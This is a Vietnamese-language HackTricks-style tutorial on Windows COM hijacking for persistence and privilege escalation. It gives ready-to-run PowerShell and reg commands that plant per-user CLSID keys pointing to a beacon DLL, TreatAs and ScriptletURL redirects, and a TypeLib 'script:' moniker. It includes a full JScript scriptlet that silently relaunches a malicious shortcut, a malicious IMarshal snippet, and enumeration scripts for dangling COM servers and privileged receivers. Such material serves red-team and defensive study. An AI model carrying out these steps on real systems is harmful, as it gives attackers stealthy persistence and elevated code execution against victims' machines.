# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Tìm kiếm các thành phần COM không tồn tại

Vì người dùng có thể sửa đổi các giá trị trong HKCU, **COM Hijacking** có thể được dùng làm **cơ chế duy trì quyền truy cập**. Với `procmon`, bạn có thể dễ dàng tìm thấy các registry COM được truy vấn nhưng chưa tồn tại và kẻ tấn công có thể tạo ra. Các bộ lọc cơ bản:

- Các thao tác **RegOpenKey**.
- có _Result_ là **NAME NOT FOUND**.
- và _Path_ kết thúc bằng **InprocServer32**.

Các biến thể hữu ích khi tìm kiếm:

- Tìm cả các khóa **`LocalServer32`** bị thiếu. Một số lớp COM là server chạy ngoài tiến trình và sẽ khởi chạy một EXE do kẻ tấn công kiểm soát thay vì DLL.
- Ngoài `InprocServer32`, hãy tìm các thao tác registry **`TreatAs`** và **`ScriptletURL`**. Nội dung phát hiện gần đây và các bài viết phân tích malware thường nhắc đến những mục này vì chúng hiếm hơn nhiều so với các đăng ký COM thông thường, nên có giá trị phát hiện cao.
- Khi sao chép một đăng ký vào HKCU, hãy sao chép **`ThreadingModel`** hợp lệ từ `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Dùng sai model thường khiến việc kích hoạt bị lỗi và làm cho hành vi hijack dễ bị chú ý.<sup>[[3]](#references)</sup>
- Trên hệ thống 64-bit, hãy kiểm tra cả chế độ xem 64-bit và 32-bit (`procmon.exe` so với `procmon64.exe`, `HKLM\Software\Classes` và `HKLM\Software\Classes\WOW6432Node`) vì ứng dụng 32-bit có thể phân giải một đăng ký COM khác.

Sau khi quyết định sẽ giả mạo COM không tồn tại nào, hãy thực thi các lệnh sau. _Hãy cẩn thận nếu bạn định giả mạo một COM được tải vài giây một lần, vì việc đó có thể là quá mức cần thiết._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Các thành phần COM của Task Scheduler có thể bị chiếm quyền

Windows Tasks sử dụng Custom Triggers để gọi các đối tượng COM. Vì chúng được thực thi thông qua Task Scheduler nên dễ dự đoán thời điểm chúng được kích hoạt hơn.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Dựa trên kết quả, bạn có thể chọn một tác vụ sẽ được thực thi **mỗi khi người dùng đăng nhập**, chẳng hạn.

Sau đó, tìm CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** trong **HKEY\CLASSES\ROOT\CLSID**, HKLM và HKCU. Thông thường, bạn sẽ thấy giá trị này không tồn tại trong HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Sau đó, bạn chỉ cần tạo mục HKCU và mỗi lần người dùng đăng nhập, backdoor của bạn sẽ được kích hoạt.

## Dangling COM Registrations and Custom Marshaling

Một COM registration toàn máy có thể trở thành primitive DLL-planting mà không cần thay đổi registry. Tìm giá trị `InprocServer32` trỏ đến một DLL không tồn tại, với đường dẫn cuối cùng có thể được người dùng ít quyền tạo hoặc sửa đổi. Đặt DLL có đúng tên vào đó sẽ khiến mọi tiến trình kích hoạt CLSID tải mã của kẻ tấn công. Trong ví dụ CrossDevice, đường dẫn đã đăng ký là `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, vì vậy người dùng tiêu chuẩn có thể tạo thư mục con và DLL còn thiếu.<sup>[[5]](#references)</sup>

### Bản đồ plugin có quyền ghi làm đường kích hoạt COM với đặc quyền cao

Bản đồ plugin-ID-to-CLSID có quyền ghi có thể cho phép người dùng ít quyền hơn chọn COM server trong tiến trình mà một dịch vụ có đặc quyền cao sẽ tải, ngay cả khi không thể chỉnh sửa đăng ký toàn máy của class đó.<sup>[[8]](#references)[[9]](#references)</sup> Trong trường hợp `InstallService` trên Windows 11 được báo cáo, người dùng tiêu chuẩn có thể sửa đổi `StaticPluginMap`; một plugin ID không tích hợp sẵn sẽ chọn một CLSID mà dịch vụ `LocalSystem` truyền cho `CoCreateInstance` cùng với `CLSCTX_INPROC_SERVER` và `IID_IInstallServicePlugin`.<sup>[[8]](#references)[[9]](#references)</sup> DLL đã đăng ký được tải vào tiến trình dịch vụ thay vì một COM host riêng biệt.<sup>[[10]](#references)</sup>

Các điều kiện liên quan là có quyền ghi thực tế vào bản đồ, có thể gửi yêu cầu plugin và có đường dẫn DLL `InprocServer32` mà người dùng ít quyền hơn có thể kiểm soát.<sup>[[8]](#references)[[9]](#references)</sup> Trong trường hợp được báo cáo, đăng ký CrossDevice ở trên đáp ứng điều kiện về đường dẫn.<sup>[[8]](#references)[[9]](#references)</sup> Đối tượng plugin phải cung cấp interface được yêu cầu, nhưng DLL được tải trước khi `CoCreateInstance` hoàn tất; việc không cung cấp interface đó tự nó không loại trừ khả năng thực thi mã trong lúc tải.<sup>[[8]](#references)[[11]](#references)</sup> Cách thức điều phối dịch vụ này khác với phương thức `IMarshal` tùy chỉnh bên dưới. Để xem primitive riêng dựa trên đường dẫn tệp, hãy tham khảo [DLL Hijacking](dll-hijacking/).

### `IMarshal` làm primitive tải DLL xuyên tiến trình

COM thường biểu diễn một con trỏ interface bằng `OBJREF` tiêu chuẩn, tham chiếu đối tượng ban đầu để bên nhận kết nối lại. Đối tượng triển khai `IMarshal` có thể tạo `OBJREF` tùy chỉnh. Phương thức `GetUnmarshalClass` cung cấp CLSID của mã sẽ tái tạo đối tượng trong tiến trình nhận. CLSID đó không cần xác định đối tượng ban đầu. COM phân giải CLSID này thành một server trong tiến trình và tải DLL đã đăng ký trước khi điều phối phương thức interface được yêu cầu.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Một triển khai độc hại tối giản chỉ cần thay CLSID không còn được tham chiếu trong `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Gửi object này qua một tham số phương thức được proxy, chẳng hạn `[in] IUnknown *`. Một lựa chọn khác là `CoGetInstanceFromIStorage`, trong đó object được custom-marshaled cũng triển khai đủ `IStorage` để vượt qua các kiểm tra cục bộ. Quá trình unmarshaling tự động trong server từ xa sẽ phân giải CLSID được thay thế, vì vậy DLL được load trước khi phương thức đích chạy.<sup>[[5]](#references)</sup>

Primitive này không chỉ áp dụng cho các đăng ký bị thiếu. Nó còn có thể buộc bên nhận load một DLL custom-unmarshaler hiện có và làm lộ lỗi trong quá trình load hoặc unmarshaling của DLL đó.<sup>[[5]](#references)</sup>

Chuỗi khai thác cần có tất cả các điều kiện sau:<sup>[[5]](#references)</sup>

1. Một CLSID hiển thị trên máy trỏ đến một DLL in-process bị thiếu hoặc có thể thay thế.
2. Attacker có thể đặt DLL đó vào đường dẫn đã được phân giải.
3. Một COM server out-of-process có thể được kích hoạt và chạy ở mức đặc quyền mong muốn.
4. Server chấp nhận custom marshaling và cung cấp một lời gọi được proxy hóa, mang object của attacker qua ranh giới tiến trình.

### Tìm các server in-process bị treo

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) và [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) có thể liệt kê cơ sở dữ liệu COM trên máy và kiểm tra từng server thông qua cơ chế phân giải module Win32 thông thường. Cách này tốt hơn `Test-Path` vì một số đăng ký chỉ chứa tên file và dựa vào đường dẫn tìm kiếm của loader.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Hãy xem kết quả là danh sách ứng viên, không phải bằng chứng cho thấy có thể khai thác. Phân giải đường dẫn theo cách loader thực hiện, sau đó kiểm tra DACL trên thư mục cha đầu tiên đang tồn tại và trên DLL đích nếu DLL đó đã tồn tại. Tệp bị thiếu chỉ hữu ích khi attacker có thể tạo hoặc thay thế đường dẫn mà COM thực sự phân giải.<sup>[[5]](#references)</sup>

### Chọn và khởi chạy một receiver có đặc quyền

Kiểm tra các lớp COM ứng viên để tìm `RunAs`, liên kết với service, các interface khả dụng và RPC proxy. Một lớp được cấu hình chạy dưới quyền `SYSTEM` nhưng không được hỗ trợ bởi một service có tên có thể không kích hoạt trực tiếp được vì RPCSS không thể khởi chạy nó. Trong trường hợp đó, hãy tìm một trigger không có đặc quyền để khởi chạy host của nó, chẳng hạn như một scheduled task có thể thực thi, và tái tạo mọi điều kiện tiên quyết về named event hoặc IPC giúp server tiếp tục chạy.<sup>[[5]](#references)</sup>

Ví dụ, chuỗi Shell Create Object Handler dễ bị tấn công đã khởi chạy host bằng cách tạo global event dự kiến trước khi gọi một scheduled task có thể thực thi bởi người dùng.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Ánh xạ tham chiếu đối tượng thu được ngược về host của nó, rồi xác minh cả danh tính lẫn chính sách marshaling. Sau đó, liệt kê các interface và chuyển đổi proxy của chúng sang IDL để tìm một tham số đầu vào như `IUnknown *` có thể marshal đối tượng giả.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Các biện pháp bảo vệ custom-marshaling

Receiver phù hợp không được từ chối custom marshaler không đáng tin cậy. Có hai biện pháp bảo vệ áp dụng trên toàn process: `EOAC_NO_CUSTOM_MARSHAL` trong capabilities được truyền cho `CoInitializeSecurity` và `COMGLB_UNMARSHALING_POLICY_STRONG` được thiết lập thông qua `IGlobalOptions::Set`. Khi có symbols, có thể kiểm tra trạng thái tương ứng trong `combase!gCapabilities` và `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager hiển thị kết quả dưới dạng `CustomMarshalAllowed` khi process parser của nó hỗ trợ bản dựng Windows đó.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` cho phép một CLSID được mô phỏng bởi một CLSID khác.<sup>[[4]](#references)</sup> Từ góc độ tấn công, điều này có nghĩa là bạn có thể giữ nguyên CLSID ban đầu, tạo một CLSID thứ hai trong phạm vi người dùng trỏ đến `scrobj.dll`, rồi chuyển hướng COM object thực sang object độc hại bằng `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Cách này hữu ích khi:

- ứng dụng mục tiêu đã khởi tạo một CLSID ổn định khi đăng nhập hoặc khi khởi động ứng dụng
- bạn muốn chuyển hướng chỉ bằng registry thay vì thay thế `InprocServer32` ban đầu
- bạn muốn thực thi một scriptlet `.sct` cục bộ hoặc từ xa thông qua giá trị `ScriptletURL`

Quy trình ví dụ (phỏng theo tradecraft công khai của Atomic Red Team và nghiên cứu trước đây về lạm dụng registry COM):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Ghi chú:

- `scrobj.dll` đọc giá trị `ScriptletURL` và thực thi tệp `.sct` được tham chiếu, vì vậy bạn có thể giữ payload dưới dạng tệp cục bộ hoặc tải từ xa qua HTTP/HTTPS.
- `TreatAs` đặc biệt hữu ích khi đăng ký COM gốc đã đầy đủ và ổn định trong HKLM, vì bạn chỉ cần một chuyển hướng nhỏ theo từng người dùng thay vì sao chép toàn bộ cây khóa.
- Để xác thực mà không cần chờ trigger tự nhiên, bạn có thể khởi tạo ProgID/CLSID giả theo cách thủ công bằng `rundll32.exe -sta <ProgID-or-CLSID>` nếu class mục tiêu hỗ trợ kích hoạt STA.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) định nghĩa các giao diện COM và được tải qua `LoadTypeLib()`. Khi một COM server được khởi tạo, hệ điều hành cũng có thể tải TypeLib liên quan bằng cách tra cứu các khóa registry bên dưới `HKCR\TypeLib\{LIBID}`. Nếu đường dẫn TypeLib được thay bằng một **moniker**, ví dụ `script:C:\...\evil.sct`, Windows sẽ thực thi scriptlet khi phân giải TypeLib — tạo ra một persistence kín đáo, được kích hoạt khi các thành phần phổ biến được truy cập.

Điều này đã được ghi nhận với Microsoft Web Browser control (thường được Internet Explorer, các ứng dụng nhúng WebBrowser và thậm chí cả `explorer.exe` tải).<sup>[[1]](#references)[[2]](#references)</sup>

### Các bước (PowerShell)

1) Xác định TypeLib (LIBID) được một CLSID có tần suất sử dụng cao dùng đến. Ví dụ về CLSID thường bị các chuỗi malware lạm dụng: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Trỏ đường dẫn TypeLib của người dùng tới một scriptlet cục bộ bằng moniker `script:` (không cần quyền admin):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Đặt một tệp JScript `.sct` tối giản để khởi chạy lại payload chính của bạn (ví dụ: một `.lnk` được dùng trong chain ban đầu):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Kích hoạt – mở IE, một ứng dụng nhúng điều khiển WebBrowser, hoặc thậm chí hoạt động thường nhật của Explorer sẽ tải TypeLib và thực thi scriptlet, kích hoạt lại chuỗi của bạn khi đăng nhập/khởi động lại.

Dọn dẹp
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notes
- Bạn có thể áp dụng cùng logic này cho các thành phần COM khác được gọi thường xuyên; luôn xác định `LIBID` thực từ `HKCR\CLSID\{CLSID}\TypeLib` trước.
- Trên hệ thống 64-bit, bạn cũng có thể tạo khóa con `win64` cho các consumer 64-bit.

## References

- [1] [Chiếm quyền điều khiển TypeLib – Kỹ thuật duy trì COM mới (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Chiến dịch ZipLine: Cuộc tấn công phishing tinh vi nhắm vào các công ty Hoa Kỳ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Xem xét lại COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Khóa CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Kỹ thuật khai thác Windows: Đăng ký đối tượng COM bị treo](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - Giao diện IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - OBJREF của MS-DCOM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [PoC Dark Elevator và bài viết kỹ thuật (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: Leo thang đặc quyền cục bộ qua Windows Install Service (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [Liệt kê CLSCTX (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [Hàm CoCreateInstance (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

